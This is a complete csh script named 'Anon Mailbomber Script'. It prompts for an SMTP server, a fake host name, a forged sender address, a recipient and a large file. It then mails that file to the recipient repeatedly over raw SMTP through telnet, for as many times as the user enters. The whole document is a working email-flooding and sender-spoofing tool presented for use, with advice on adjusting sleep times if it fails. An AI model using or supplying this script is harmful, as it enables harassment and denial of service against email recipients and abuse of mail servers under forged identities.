#! /bin/csh
##Anon Mailbomber Script
##You may need to screw w/ the sleep times if this doesn't work.
echo -n "What is the name of the SMTP server you want to use?"
set serv = $<

echo -n "What is the fake host name?"
set fake = $<

echo -n "Who should it appear to be from? (usr@host)"
set from = $<

echo -n "Who is the lucky recipient?" 
set to = $<

echo -n "Name of the BIG file you want to mail?"
set file = $<

echo -n "How many times should it be sent ?"
set amount = $<
set loop_count = 1
echo "Don't press anything untill you see the Mailbomb Complete message."
while ($loop_count <= $amount)
(sleep 3;echo "helo" $fake;sleep 1;echo "mail from:"$from;sleep 1;echo "rcpt to:"$to;sleep 1;echo data;echo "From:"$from;sleep 1;cat $file;echo ".";sleep 2;echo "quit") | telnet $serv 25 
	@ loop_count++
end
echo "Mailbomb Complete"



